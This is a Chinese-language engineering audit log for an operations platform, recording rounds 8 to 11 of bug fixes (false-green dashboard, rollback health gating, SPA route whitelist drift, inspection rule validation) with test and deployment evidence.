- 剩余 `except: pass` 静默失败分诊（本轮 8.4 就是此类：一个 NameError 藏了很久）。
- MCP 工具描述与 `mcp_capability_service.py` 能力目录一致性巡检（含"目录里有、注册表里没有"的名字）。
- 保留清单：密钥轮换（待业主决定）、`ENV=local` 关闭生产安全轨相关项、fnOS/OpenClaw 遗留项。

### 附：第 8 轮可复现的验证脚本

- `tests/test_servers_batch_update_contract.py`（22 项）：批量字段覆盖/未知字段拒绝、
  auth_type 枚举与凭据校验、port 校验、批量与单机分组同步、历史脏值兼容；
- `fnos-migration/_verify_round8_servers.py`（未入库）：对**部署后的 OPS 生产进程**做端到端实测，
  全部操作仅作用于临时探测服务器（用后删除，不触碰 78 台真实服务器）。

#### 部署后实测证据（2026-09-12，OPS 重启后 PID 17140；17 项断言全部 OK）

| 实测项 | 结果 |
| --- | --- |
| 创建接口 auth_type 校验 | `auth_type="key"` → **400** `Unsupported auth_type: key（可选：password, key_file, key_content）` |
| 批量 status | 批量置 `disabled` 后复查该服务器 `status=disabled`（修复前返回成功但仍是 online） |
| 未知字段 | `updates={"password":"x"}` → **400** 并列出支持字段 |
| 切换认证方式 | `key_file→password` 且无密码 → `updated=[]`、`failed=[{"error":"密码认证模式下必须提供密码"}]`，认证方式未被改坏 |
| port 校验 | `"abc"` → 400；`70000` → 400 |
| 分组同步 | 批量改组后 `server_groups` 立即出现该成员；单机改回空组后成员被剔除（修复前此处是 NameError） |
| 生产数据复原 | 探测服务器删除后 78→78 台、组『测试』`[]→[]`，无残留 |
| 全量测试套件 | `pytest tests/ -q` → **1492 passed**（第 7 轮 1470 + 本轮新增 22） |

> 运维提示：本轮只改后端，**需重启 OPS 生效**（前端无改动，无需 Ctrl+F5）。
> 前端批量弹窗的"服务器状态"现在会真正生效；改认证方式请逐台在编辑页填写对应凭据。

## 第 9 轮（2026-09-12）

本轮范围：**前端展示层（React）+ MCP 工具描述层**——前 6 轮都在后端，
这是第一次系统复核浏览器侧的真实表现与 AI 侧的工具可发现性。

### 一、已修复

#### 9.1 【中危】首页"假绿"：取数失败时显示 92% + ONLINE + 运行正常 + 一切正常

`DashboardPage` 用一行表达健康度：

```ts
const score = backendOnline ? (dashboard?.score ?? 92) : 60
const statusText = ... : backendOnline ? '运行正常' : '后端离线'
```

只要 OPS 进程还在监听（`/health` 通），而 `/dashboard` 接口失败（500、DB 异常、
权限问题），`dashboard` 就是 null → 兜底成 **92%**，色调由 92 判定为绿色，
站点态势面板还会显示"一切正常"标签。运维看板给出**全绿假象**，
比直接报错危险得多；真正的错误只出现在健康检查 widget 里，与顶部结论互相矛盾。

- **修复**：新增纯函数模块 `frontend/src/utils/dashboardStatus.js`
  （`deriveDashboardStatus` / `toneForScore` / `statusTextFor`），把
  "有没有真实数据（available）"与"分数是多少"分开表达：
  - 取数失败 → `score=null`、显示 `—`、色调 `warn`、结论"数据不可用"、
    标签"工作台数据获取失败"，并在 hero 下方给出**失败原因**横幅；
  - 后端离线 → `—` + danger + "后端离线"（不再显示编造的 60%）；
  - 真分数 0 分是**有效的坏分数**，不再被当成"无数据"；
  - 服务端 `status=critical/attention` 的结论保留展示。
  `scoreTone()` 的阈值口径收敛到该模块，避免两处各写一套。
- **红灯对照**（`fnos-migration/_verify_round9_frontend.js`）：
  修复前 `orb 显示 92%（绿色）、状态"运行正常"、标签 "一切正常"`；
  修复后 `orb 显示 —、状态"数据不可用"、色调 warn、标签 ["工作台数据获取失败"]`。

#### 9.2 【中危】MCP 工具描述层：12 个已注册工具被替换成"样板句"，AI 无法按意图发现

`english_tool_description()` 在**没有覆盖条目**时会**丢弃工具自身描述**，
生成一句无信息量的样板文字：

```
OPS capability tool ops.wait_job. Category: job_read. Risk: low.
```

而工具注册表里这些工具本来都有完整说明（做什么、什么时候用、中文关键词）。
受影响的是 12 个真实能力：`ops.security_module.{install,probe,setup}`、
`ops.security_report.{collect,get_daily_report,summarize}`、
`ops.inspection.run_security_daily`、`ops.wait_job`、
`ops.integration.{get_context_pack,get_flow_guide,get_heartbeat_ops,save_lesson}`。
对 AI 客户端而言，这些能力"存在但不可发现"——用户说"给服务器装安全模块"
或"等这个任务跑完"，agent 无法把意图匹配到工具上。

- **修复**：
  1. 回退逻辑改为**优先使用工具自身描述**（`mcp_safe_description`，保留 Han 与
     `中文:` 关键词），只有工具自身也没有描述时才退化为样板句；
     同时把该分支的收尾从 `ascii_only`（会把中文全部抹成 `: / .`）改为
     `mcp_safe_description`，与覆盖条目分支保持一致；
  2. 按邻居风格补齐 12 条精选双语覆盖描述（英文语义 + `中文: 关键词`）；
  3. 新增 `tests/test_mcp_tool_descriptions.py`（5 项契约）：任何已注册工具不得落到
     样板句、无覆盖时必须保留自带描述、无描述才允许样板句、覆盖条目优先、
     12 条覆盖必须存在且含中文关键词。
- **红灯证据**：`AssertionError: 以下已注册工具的 MCP 描述退化为样板句，AI 无法按意图发现它们`
  + `缺少描述覆盖：[...12 个...]`；修复后 5 passed，实测 126 个工具样板句数量为 **0**。

#### 9.3 【中低危】MCP 调用审计列表的请求竞态：逐键发请求 + 陈旧响应覆盖新结果

`McpAuditPage` 的筛选输入框每敲一个字符就发一次请求（无防抖），且没有任何时序
保证——慢的旧请求后到会把新结果覆盖掉，表格显示的是上一个关键字/上一页的数据，
且没有任何提示。这正是"前端竞态"类缺陷。

- **修复**：输入走 `useDebouncedValue(300ms)`（复用既有 hook，与 `EntityPicker`/
  `LogConsole` 一致）；新增可测试的时序守卫 `frontend/src/utils/requestGuard.js`
  （`createRequestGuard().begin()/isCurrent()`），响应回来先校验 token，
  陈旧响应直接丢弃（连 `loading` 与错误提示也一并丢弃，避免旧请求把新请求的
  错误态写进去）；"筛选"按钮语义改为"刷新"，placeholder 标注"输入即筛选"。
- **红灯对照**：修复前 `表格最终显示关键字 "o"`（应为 ops）；修复后 `"ops"`。

#### 9.4 【低危】删除误导性死模块 `frontend/src/services/liveStatus.ts`（230 行）

`fetchLiveSnapshot` / `runNodeProbe` / `riskFromStatus` / `NODE_ROUTES` 四个导出
在前端全仓**零导入**（ripgrep 大小写敏感确认；PowerShell 的 `Select-String`
默认忽略大小写会把 `isLiveStatus` 误判为使用点）。其文档注释声称"供 Dashboard
SiteStatusPanel 与 Diagnostics ProbeDropdown 复用"，但 `ProbeDropdown` 全仓不存在，
而 `SiteStatusPanel` 早已改为在 `DashboardPage` 内自行取数与渲染（并且正确区分
ONLINE/OFFLINE）——这是一次迁移后遗留的孤儿模块。

- **修复**：删除该文件（git 历史可回溯）。
- **连带修正（重要）**：删除后全量测试出现 1 处失败——
  `tests/test_frontend_modal_stacking_contract.py::test_unclosed_status_semantics_shared_across_frontend`
  会打开该文件并断言其中恰好有两处 `status: 'OPEN,PROCESSING'`。
  即"死模块"曾被一条**源码级契约测试**当作口径一致性的一半证据。
  这里没有选择回滚删除，而是把用例改为**更强的不变式**：
  未闭环口径在整个前端只能出现一次（唯一定义处 `UNCLOSED_STATUS`），
  任何文件再手写字面量都会失败。删除后实测该字面量确实只剩 1 处。

#### 9.5 【低危】`useSmartPolling` 的 `idleMs` 是无效配置（声明、默认值、调用方都传了，但从不生效）

`nextDelay()` 只读 `activeMs`/`hiddenMs`，`idleMs` 从未被使用；而
`TaskCenterPage` 两处调用都按"空闲时降频"的预期传了 `idleMs: 30000/15000`。
这类"看起来能配、实际无作用"的选项会把排障引向错误方向。

- **修复**：删除该选项（接口、两处默认值、两处调用点），并在 hook 注释里写明原因。
  没有选择"顺手实现空闲降频"——回调不返回变更信号、`idleMs` 语义（间隔还是阈值）
  本身不明确，凭空实现等于发明新行为。

### 二、已排除 / 记录（本轮审计结论，避免误修与误报）

| 审计项 | 结论 |
| --- | --- |
| `MCP_TOOL_DESCRIPTION_OVERRIDES` 里 54 个"幽灵条目"（表里有、注册表没有，如 `ops.create_server`、`ops.batch_update_servers`、`ops.db.execute_dml`） | 该表**只做描述查表**（`english_tool_description` 按名取值），工具清单来自 `registry.list_tools()`，幽灵条目永不被读取 → **死配置，不会把不存在的工具暴露给 AI**。记录为待办清理，不在本轮删除（部分名称疑似为规划中的工具预留） |
| 54 个幽灵条目是否影响能力哈希/缓存 | 只参与 `capability_version` 摘要，无功能影响 |
| `TaskCenterPage` 轮询是否"自动刷新中却永不刷新" | 未发现：`load`/`refreshSelected` 均由 `useCallback` 包裹且依赖为原始值，effect 不会每次渲染重启；`useSmartPolling` 单飞 + 可见性感知 + 退避逻辑正确 |
| `SiteStatusPanel`（在用的那个）是否也有假绿 | 没有：`!backendOnline` 时明确返回"后端离线"空态，本轮只补充了 degraded 分支 |
| `useDebouncedValue` / `useCachedResource` / `useUrlQueryState` / `useRoutePrefetch` 是否死代码 | 都在使用中（`EntityPicker`、`LogConsole`、`ServerListPage`、`AuditLogPage`、`App`），非死代码 |
| 前端筛选改值是否漏重置分页 | 抽查 `AuditLogPage` / `ReportCenterPage` / `TaskCenterPage` / `McpAuditPage` 均在改筛选时 `setOffset(0)` 或 `setPage(1)`；未发现"第 3 页改筛选后空白"类缺陷 |
| `McpAuditPage` 其余调用点是否同样有竞态 | `EntityPicker`/`LogConsole` 已有防抖但无时序守卫，风险等级低于本轮的表格页；记录为待办（可复用 `requestGuard`） |

### 三、待办（后续轮次）

- 巡检域 20+ 个 analyzer 的业务判定口径逐个复核（后端）。
- 部署/执行/维护链路确认闸门与回滚一致性；`except: pass` 静默失败分诊。
- 清理 `MCP_TOOL_DESCRIPTION_OVERRIDES` 的 54 个幽灵条目（或就地注明"为规划工具预留"）。
- 给 `EntityPicker` / `LogConsole` 的异步搜索补时序守卫（复用 `requestGuard`）。
- 保留清单：密钥轮换（待业主决定）、`ENV=local` 关闭生产安全轨相关项、fnOS/OpenClaw 遗留项。

### 附：第 9 轮可复现的验证脚本

- `frontend/tests/dashboardStatus.test.js`（7 项）、`frontend/tests/requestGuard.test.js`（4 项）：
  `cd frontend && npm run test:unit`（已并入 `test:unit` 脚本）；
- `tests/test_mcp_tool_descriptions.py`（5 项，Python 套件内）；
- `fnos-migration/_verify_round9_frontend.js`（未入库）：修复前/后对照，8 项断言；
- `fnos-migration/_verify_round9_live.py`（未入库）：对部署后的 OPS 实测 18 项断言；
- `fnos-migration/_audit_round9_mcp.py`、`_audit_round9_tools.py`（未入库）：描述覆盖表双向一致性审计。

#### 部署后实测证据（2026-09-12，OPS 重启后 PID 18108；18 项断言全部 OK）

| 实测项 | 结果 |
| --- | --- |
| MCP `tools/list` | 返回 **126** 个工具，描述为样板句的数量 **0**（修复前 12 个） |
| 12 个原缺描述工具 | 全部在清单中且描述含英文语义 + `中文:` 关键词（如 `ops.wait_job` → "Wait for a unified job center task to reach a terminal state … 中文: 等待任务/等待结果"） |
| 前端 bundle | 运行中服务返回的 `DashboardPage` chunk 含"数据不可用"与"工作台数据获取失败"（首页假绿修复已上线） |
| 单元/契约测试 | 前端 `node --test` 16 passed；Python `pytest tests/ -q` → **1497 passed**（第 8 轮 1492 + 本轮 5） |

> 运维提示：本轮**既改后端也改前端**。后端已重启（PID 18108）生效；
> 前端产物已用 `npm run build` 重建（`frontend/dist`，单进程模式静态托管），
> 浏览器请 **Ctrl+F5** 强制刷新，否则可能仍加载旧 chunk。

## 第 10 轮（2026-09-12）

本轮范围：**回滚链路（执行与判定口径）+ SPA 深链分发**。两条线都是"看起来正常、
实际在骗人"的类型：回滚把"服务没起来"记成成功；SPA 深链只在**已登录**时才 404，
匿名测试永远正常。

测试基线上轮 1497 → 本轮结束 **1518 passed**（+21：回滚健康 12 项、SPA 白名单契约 9 项）。

### 一、已修复

#### 10.1 【中危】回滚健康检查结果被丢弃：服务没恢复也算"回滚成功"

`app/deploy/rollback.py` 的执行循环里：

```python
if exit_code == 0:
    self.log_to_db(..., f"Rollback success on {server_name}", ...)
    self.run_health_checks(task_id, deployment_id, server_name, ssh, topology)   # ← 返回值被丢弃
...
final_status = "success" if success_all else "failed"
self.send_release_notification("rollback.success" ...)
```

而 `run_health_checks` 的类型声明是 `Callable[..., bool]`，实现
`app/api/deploy/_shared.py::_log_rollback_health_commands` 也**确实返回了 `all_ok`**
（逐条探测，任一失败即 False）。**这个布尔值没有任何调用方读取**：

- 回滚命令成功、但服务没起来（进程没拉起 / HTTP 健康检查 502）时，
  任务状态 `success`、发布单状态 `success`、并发出 `rollback.success` 通知；
- 对照：正向发布的 `HealthCheckStep` 在健康检查失败时 `raise RuntimeError("健康检查失败: …")`
  **直接让发布失败**——同一份"健康检查"，发布链路当门禁、回滚链路当摆设，口径不一致。

对运维的实际危害：回滚后服务仍然不可用，平台却报成功，值班人员会停止排查。

- **修复**：把探测结果纳入判定。任一服务器健康检查未通过 → `success_all = False`，
  任务/发布单记为 `failed`，结果文案明确区分"命令失败"与"健康检查未通过"：
  `回滚命令已执行，但健康检查未通过：srv-a, srv-b`；通知 payload 里同时写入
  `result` / `health_checked_servers` / `health_failed_servers`，让 Matrix/OpenClaw
  侧看到的也是实情。未配置任何探针时仍返回 True（不影响原有成功口径）。

#### 10.2 【中危】进程健康探针"假通过"：退出码被管道末端的 `head` 吞掉

`app/deploy/rollback_health.py` 生成的进程探针是：

```bash
pgrep -af <keyword> | head -3 >/dev/null
```

POSIX shell 里**管道的退出码取最后一个命令**，即 `head`（恒为 0）。也就是说：
**进程不存在时该探针也返回 0**，"进程存活"这项检查永远不会失败。

- **修复**：去掉管道，直接用 `pgrep` 自身的退出码（无匹配返回 1）：
  `pgrep -af <keyword> >/dev/null 2>&1`。
- **行为层证据**（Git Bash 实测）：
  `false | head -3 >/dev/null` → 退出码 **0**（假通过）；
  `false >/dev/null` → **1**（失败可传播）；
  `pgrep -af ops-no-such-process-xyz >/dev/null` → **非 0**（正确判定不健康）。
- 意义：如果只修 10.1 而不修这里，门禁会被这个"永远通过"的探针绕过（只要 service 配了
  process_keyword 就恒真）——两者必须一起修。

#### 10.3 【中危】回滚健康检查没有重试（与正向发布不一致）

正向发布 `HealthCheckStep` 默认 **重试 3 次 / 间隔 5s**；回滚侧只有**单次**探测
（且是同步调用，想重试也只能阻塞事件循环，所以一直没加）。服务启动稍慢就会被判"不健康"，
这也是此前一直不敢把探测结果纳入判定的原因之一。

- **修复**：`_log_rollback_health_commands` 改为 async，重试默认 3 次 / 间隔 5s，
  `ssh.exec` 走线程池、等待用 `asyncio.sleep`，**不阻塞部署 worker 的事件循环**；
  `RollbackRuntime` 用 `inspect.isawaitable()` 兼容同步实现（外部自定义实现不被破坏）。

#### 10.4 【中危】SPA 深链白名单漂移：**已登录**用户刷新 6 个页面会 404

前端**已登录**状态下直接访问（刷新）以下真实页面，返回 `404 {"detail":"Not Found"}`，
页面完全打不开：

| 页面 | 路径 | 修复前(已登录) |
| --- | --- | --- |
| MCP 审计 | `/mcp/audit` | 404 JSON |
| MCP 工具 | `/mcp/tools` | 404 JSON |
| 新建项目 | `/systems/create` | 404 JSON |
| 编辑项目 | `/systems/:name/edit` | 404 JSON |
| 新建服务 | `/systems/:systemName/services/create` | 404 JSON |
| 编辑服务 | `/systems/:systemName/services/:serviceName/edit` | 404 JSON |

根因：SPA 分发是**两份硬编码清单**——前端权威清单 `frontend/src/routes.ts::SPA_PAGE_ROUTES`
与后端 `app/pages.py::SPA_ROUTES`。后端那份少了上述 6 条，并多出 5 条前端根本不存在的
历史条目（`/deployments`、`/services`、`/logs`、`/config`、`/groups`）。
请求先过会话中间件：未登录 → 307 跳 `/login`（浏览器跟随登录页，**200 HTML**）；
已登录 → 进入路由匹配，白名单里没有就 404 JSON。

**为什么长期没被发现**：所有"随手一测"都是匿名访问，看到的是登录页 200——假正常。
这正是本轮实测暴露它的方式（对比 `anon` / `auth` 两列才看出来）。

- **修复**：`SPA_ROUTES` 与前端权威清单**逐条对齐**（补齐 6 条，参数路由改用 FastAPI
  的 `{param}` 语法并排在字面量之后），删除 5 条历史残留；
  新增契约测试 `tests/test_spa_route_whitelist_contract.py`（9 项）解析
  `frontend/src/routes.ts` 强制两份清单双向一致——**再漂移就会红**。

#### 10.5 【低危】`/health` 不存在却"永远 200"：假就绪信号

`main.py` 只注册了 `/healthz`。而 `docs/runbooks/EVENT_LOOP_BLOCKING_FIXES.md` 明确
把 `GET /health` 当存活探测记录下来（"`GET /health` → 200"），实际那个 200 是
**SPA/登录页的 HTML**（未登录 307 跳登录页后 200），与后端是否健康无关；
已登录访问则是 404 JSON。

- **修复**：把 `/health` 注册为与 `/healthz` 等价的 JSON 存活探测（并加入
  `PUBLIC_PATHS`，探测不需要登录）；同时更正 runbook 里那条错误结论，
  说明历史现象与推荐用法（继续用 `/healthz`，`/readyz` 带 DB 检查）。
- 实测（修复后）：`/health` 与 `/healthz` 都返回 `{"status":"ok","service":"ops-platform"}`，
  `/readyz` 返回 `{"status":"ready","checks":{"database":"ok"}}`。

### 二、已排除 / 记录（本轮审计结论）

| 审计项 | 结论 |
| --- | --- |
| 回滚锁是否泄漏 | 未发现：`run()` 的 `finally` 中释放 `lock_keys` 并关库；异常路径（无安全方案直接 `return False`）同样走 finally（测试断言 `released_locks == [["deploy:crypto-trader"]]`） |
| 回滚"无安全方案"分支 | 正确：记 `blockers` 场景下直接 `return False`，任务与发布单都置 failed，不发成功通知 |
| `app/deploy/rollback.py` 是否被浏览器与 MCP 两条链路复用 | 是同一实现：`_run_rollback_task`（Capability Server / MCP）与浏览器都构造 `RollbackRuntime`，修一处两条链路同时生效 |
| `pgrep -- <kw>` 是否也匹配到探针自己 | 探针命令里含关键字本身，`pgrep -f` 可能匹配到 `bash -c "pgrep -af kw …"` 自身（假阳性的经典坑）。本次**未改**匹配语义（改动会放大行为变化），但已记录：若要把进程探针当强门禁，应改用 `pgrep -f` 排除自身或 `systemctl is-active` 之类的确定性检查 |
| `scripts/ci_local.sh` 聚焦清单里 3 个不存在的测试文件 | `test_deploy_refactor_contract.py`、`test_release_switch_and_rollback.py` 在本包不存在（脚本按存在性过滤并打印 `skip:`，属"精简包"设计）；本轮补齐了清单里一直缺失的 `tests/test_rollback_health.py`，并新增 `test_spa_route_whitelist_contract.py` 入清单 |
| `app/` 内 157 处 `except …: pass` | 本轮只做了分布盘点（部署/维护/工具适配器/终端会话为主），逐点分诊留待后续轮次；本次修掉的静默失败属于"返回值被丢弃"型（见 10.1），比 `except: pass` 更隐蔽 |
| 前端 `routes.ts` 中 `ROUTES.mcpTools`/`mcpAudit` 是否有入口 | 有：`ToolAccessPage` 侧栏可跳转，`SPA_PAGE_ROUTES` 也早已正确声明——问题只在后端副本没跟上 |

### 三、待办（后续轮次）

- 巡检域 20+ 个 analyzer 的业务判定口径逐个复核（后端）。
- 部署/执行/维护链路确认闸门与回滚一致性（本轮已修"回滚健康门禁"这一条）。
- `except …: pass` 157 处静默失败分诊（优先部署/维护/凭据相关）。
- 进程探针自身的 `pgrep -f` 自匹配问题（见上表记录）。
- 清理 `MCP_TOOL_DESCRIPTION_OVERRIDES` 的 54 个幽灵条目。
- 给 `EntityPicker` / `LogConsole` 的异步搜索补时序守卫（复用 `requestGuard`）。
- `period` API 参数校验；`update_issue` 无 `deadline_at` 到期提醒。
- 保留清单：密钥轮换（待业主决定）、`ENV=local` 关闭生产安全轨相关项、fnOS/OpenClaw 遗留项。

### 附：第 10 轮可复现的验证脚本

- `tests/test_rollback_health.py`（12 项，已加入 `scripts/ci_local.sh` 聚焦清单）：
  探针命令形状 + 管道语义行为证据（Git Bash）+ `RollbackRuntime` 门禁（成功/失败/重试/awaitable）。
- `tests/test_spa_route_whitelist_contract.py`（9 项）：后端白名单与
  `frontend/src/routes.ts::SPA_PAGE_ROUTES` 双向一致 + 路由真实注册 + 5 条深链行为断言。
- `fnos-migration/_verify_round10_live.py`（未入库）：对部署后的 OPS 实测 16 项断言。
- `fnos-migration/_probe_round10_spa.py`（未入库）：SPA 深链匿名/已登录对照探测（暴露 10.4 的工具）。

#### 部署后实测证据（2026-09-12，OPS 重启后 PID 30008；16 项断言全部 OK）

| 实测项 | 结果 |
| --- | --- |
| 回滚预检探针（运行中进程产出） | `process=pgrep -af crypto-trader-web >/dev/null 2>&1`、`path=test -d /data/web`——**无管道**（修复前为 `pgrep … \| head -3 >/dev/null`） |
| 6 条原失效深链（已登录） | `/mcp/audit`、`/mcp/tools`、`/systems/create`、`/systems/:name/edit`、`/systems/:systemName/services/create`、`…/:serviceName/edit` 全部 **200 + SPA HTML**（修复前 404 JSON） |
| 对照深链 | `/servers` 仍 200 HTML（无回归） |
| 存活探测 | `/health`、`/healthz` → 200 JSON；`/readyz` → `ready`（DB ok） |
| 测试 | 全量 `pytest tests/ -q` → **1518 passed**（1497 + 21）；红灯对照：回滚门禁 `assert True is False`、SPA 契约 `缺少 6 条 / 多出 5 条`、行为断言 5 条 404 |

> 运维提示：本轮**只改后端**（无前端源码改动，无需 `npm run build`、也无需 Ctrl+F5）。
> 后端已重启（PID 30008）生效。
> 另外：本轮**刻意没有**触发真实回滚来验证 10.1 的门禁语义——那会 SSH 真实服务器
> 并向发版房间发通知。该语义由 12 项单元测试（假 runtime + 假 ssh）覆盖，
> 线上只做只读的预检接口验证。

## 第 11 轮（2026-09-12）

本轮范围：**巡检判定口径**（第 10 轮待办第一条：20+ analyzer 的业务判定逐个复核）
与**巡检台账/报表入参校验**。修出来的问题和前几轮同族——**不报错，但结论是错的**：

- 自定义规则的比较符写错（`gte`/`=<`）不会提示，而是**静默按 `>` 判定**，可以给出 `PASS`；
- 阈值/提取器配置零校验：`"10GB"` 到运行期才崩，`mode` 拼错则规则**永远不触发**却仍显示"已启用"；
- 台账/报表传 `?period=quarterly` 不报错，而是返回一份**区间其实是"今天"**的数据；
- 内存判定里的 swap 兜底分支是死代码，某些 `free` 输出下 `swap_pct` 静默停在 0%；
- 顺手修掉一个挂钟毫秒竞态导致的**偶发红**（全量跑 1 failed，单跑必过）。

测试基线上轮 1518 → 本轮结束 **1579 passed**（+61：判定口径契约 60 项、Matrix 媒体顺序 1 项）。

### 一、已修复

#### 11.1 【中危】比较符写错 = 静默换一套判定口径，配置错误变成"假绿 PASS"

`app/services/inspection_center.py::_apply_comparator` 原实现：

```python
if comparator == ">":    return value > threshold
if comparator == ">=":   return value >= threshold
...
if comparator == "contains": return str(threshold) in str(value)
return value > threshold          # ← 未知比较符静默退化成 ">"
```

前端下拉只提供 `> / >= / < / <= / == / contains` 六个值，但后端**从不校验**：
用 API/脚本写规则时把比较符写成 `gte`、`=<`、`!=`，判定会**照常出结论**，
而且方向可能与配置意图相反（例如"低于阈值才告警"被算成"高于阈值才告警"）。

修复：未知比较符抛错（缺省/空值仍按历史约定视为 `>`）。这一点很关键——错误发生在
`_remote_check` 的 analyzer 调用里，**会被记成可见的 `ERROR` 巡检项**（`status=ERROR` +
`巡检项执行失败：不支持的比较符 'gte'（仅支持 >/>=/</<=/==/contains）`），
既不会静默给 PASS，也不会炸掉整轮巡检。

- 红灯证据（本轮新增契约测试）：`AssertionError: 未知比较符必须落成 ERROR，实际 PASS`
  ——即修前该规则判定为"无风险"。

#### 11.2 【中危】`extractor` / `threshold` 配置零校验，两种失败都很隐蔽

同一函数的建/改规则入口（`update_rule` / `create_rule`）此前只校验 `risk_level` 与
`scope_type`，`config.extractor`、`config.threshold` 原样落库：

| 写错的字段 | 修前后果 |
| --- | --- |
| `threshold.high = "10GB"` | 巡检执行时 `float('10GB')` 抛 `ValueError`，报错文本只有 `could not convert string to float: '10GB'`，看不出是哪条规则的哪个阈值 |
| `extractor.mode = "regexp"`（拼错） | `_extract_value` 走 `return {"value": None, "method": f"unknown-{mode}"}` → 提取值为 None → 阈值判定**整体跳过** → 规则**永远不会触发**，界面却显示"已启用" |
| `extractor.mode = "regex"` 但 pattern 非法/为空 | 运行期 `re.error` |
| `extractor.mode = "keyword"` 但没有 keywords | 运行期无命中，同样静默失效 |

修复：新增 `validate_rule_config()`，在建/改规则时校验并归一化（比较符白名单、阈值必须可转
数字、regex 必须能编译、keyword 必须非空、mode 必须是 `regex/numeric/keyword/json` 之一），
非法一律 **HTTP 400**，且发生在**任何写库之前**（`update_rule` 里放在最前面，`create_rule`
复用同一路径）。错误信息直接指出字段与受支持取值：

```
config.threshold.comparator 仅支持 >/>=/</<=/==/contains，收到 'gte'
config.extractor.mode 仅支持 regex/numeric/keyword/json，收到 'regexp'
阈值 high 不是数字：'10GB'（阈值只接受数字，单位请写在 threshold.unit）
```

#### 11.3 【低-中】台账/报表的 `period`/日期参数静默兜底：区间错了但报表"看起来正常"

第 5 轮修掉了 `period` 未知时的 `UnboundLocalError`，落到"兜底为今日"，并把这个行为
**锁定成服务层契约**（`tests/test_inspection_period_window.py`：不得因未知 period 让接口 500）。
但 HTTP 边界一直没做校验，于是：

```
GET /api/v2/inspection/ledger?period=quarterly          → 200 + 一份"今日"台账（period 标签还写 daily）
GET /api/v2/inspection/reports/periodic-preview?period=7d → 200 + "每日巡检台账"
GET /api/v2/inspection/ledger?period=daily&date_from=2026-09-10&date_to=2026-09-01 → 200 + 空数据
```

修复采取**两侧分工**，不破坏第 5 轮锁定：

- 新增 `validate_period_query()`：周期白名单（`daily/weekly/monthly` + `day/week/month` 别名）、
  日期必须能解析（`YYYY-MM-DD` 或 ISO8601）、`date_from <= date_to`，否则 **400**；
- 接到 4 个入口：`GET /ledger`、`GET /reports/periodic-preview`、`POST /reports/periodic`、
  `POST /ledger/delete`；
- 服务层 `_period_bounds` 的"未知周期兜底为今日"**保持不变**（内部调用方不会被 500 打断），
  该边界由本轮测试双向锁定。

顺带把 `_parse_dt` 拆出严格的 `_try_parse_dt`（失败返回 None，供参数校验区分"没传"与"传错"），
`_parse_dt` 自身的兜底语义不变。

#### 11.4 【低】内存判定里的死代码：`swap_pct` 在某些 `free` 输出下静默为 0%

`_analyze_memory` 里原有一段"用 `free` 的 used 列兜底算 swap 使用率"的分支：

```python
if swap_total_kb > 0:
    swap_pct = int(round((swap_total_kb - swap_free_kb) / swap_total_kb * 100))
elif source == "free":                      # ← 进入这里的前提就是 swap_total_kb <= 0
    ...
    if swap_total_kb > 0:                   # ← 恒为假，永远算不出结果
        swap_pct = int(round(used / swap_total_kb * 100))
```

条件自相矛盾 → 整段是死代码；而 `Swap:` 行的解析又要求**至少 4 列**（total/used/free），
所以只给 total+used 的输出（部分 `free` 变体/截断输出）会让 swap 使用率**静默停在 0%**，
一台正在大量使用 swap 的机器会被判成"内存健康"。

修复：Swap 行解析放宽到 ≥3 列（free 列可选），使用率**优先用 used 列**、
缺失时才用 `total-free` 推算，并夹紧到 `0..total`（异常输入不会算出 >100%）。
阈值口径与 `criteria` 文案未变，既有 analyzer 契约测试全部保持通过。

#### 11.5 【低】全量测试偶发红：Matrix 媒体列表顺序依赖挂钟毫秒

本轮全量跑出现 `1 failed`（单跑必过、连跑 3 次必过）：

```
tests/test_matrix_e2ee.py:282: in test_list_media_events_async_with_decryptor
    assert [e.event_id for e in events] == ["$enc1", "$enc2"]
E   AssertionError: assert ['$enc2', '$enc1'] == ['$enc1', '$enc2']
```

排查结论：**不是实现问题**，是测试夹具的竞态。`MatrixClient.list_media_events_async`
是顺序 `await`（无并发），最后按 `origin_server_ts` **倒序**排序；而两条被测事件的
时间戳来自夹具 `_decrypted_inner()` 内部的挂钟毫秒：

```python
now_ms = int(time.time() * 1000)          # 每次调用各取一次
"origin_server_ts": now_ms - 60_000
```

两个事件连续解密，全量负载下两次调用很容易跨过 1ms 边界 → 后解密的事件时间戳更大 →
倒序后排到最前，断言随机失败。修复：夹具支持显式 `ts_ms`（显式值即最终值），
测试改为**断言真实语义"最新在前"**（`["$enc2", "$enc1"]`），并新增一条确定性用例
锁定"同一时间戳保持输入顺序"的稳定性契约。

- 机制复现脚本：`fnos-migration/_repro_round11_matrix_order.py`（未入库，纯内存无网络）：
  ```
  旧夹具（挂钟毫秒）顺序 = ['$enc2', '$enc1']
    旧断言 ['$enc1', '$enc2'] 失败（顺序反转）
  新夹具（显式时间戳）顺序 = ['$enc2', '$enc1']（期望 ['$enc2', '$enc1']：最新在前）
  ```

### 二、已排除 / 记录（本轮审计结论，避免误修与误报）

| 审计项 | 结论 |
| --- | --- |
| `RISK_WEIGHT` / `RISK_ORDER` / `_compute_score` / `_aggregate_risk_counts` | 复核一致：`_compute_score = max(0, round(100 - min(60, (H*15+M*8+L*2)/server_count)))` 与文档公式一致；`_aggregate_risk_counts` 的 `normal` 逐行计数是第 8 轮确认过的**刻意设计**（有测试锁定），未动 |
| `<` / `<=` 比较符要求阈值**升序**（high < medium < low） | 是既有语义而非 bug：`_evaluate_threshold` 顺序取首个命中档位；`tests/test_custom_rule_engine_standalone.py` 已用升序样例锁定（5/15/25/50 → HIGH/MEDIUM/LOW/NONE）。本轮未改语义，只改了前端标签与提示 |
| 内存单位启发式（`free -m` 且总量 < 1000 会被判成 G） | 只影响 `mem_total`/`swap_total` 的**展示文本**：`mem_pct`/`swap_pct` 用同一单位做除法，比值不受影响。未改（改动会牵动多处展示口径），记录备查 |
| `_parse_mem_value`（无单位版） | 全仓无调用方，且 docstring 声称 `"1.5G" → 1572864` 而实际返回 1（只剥后缀不换算）。本轮**只更正文档**，未删函数（避免动无调用代码） |
| `tests/test_custom_rule_engine_standalone.py` 把规则引擎**复制**了一份 | 该文件自带 `_apply_comparator`/`_extract_value`/`_evaluate_threshold` 副本，实现改动后副本不会同步 → 存在语义漂移风险（本轮已确认其断言仍成立）。待办：改为从实现导入或由实现生成 |
| analyzer 异常是否会让整轮巡检失败 | 不会：`_remote_check` 的 `except Exception` 把 analyzer 异常转成 `status=ERROR` 的巡检项（本轮正是利用这一点把"配置错误"变成可见失败） |
| `_analyze_memory` 里 free 输出的启发式单位探测 | 与上面"内存单位启发式"同一条记录，未改 |
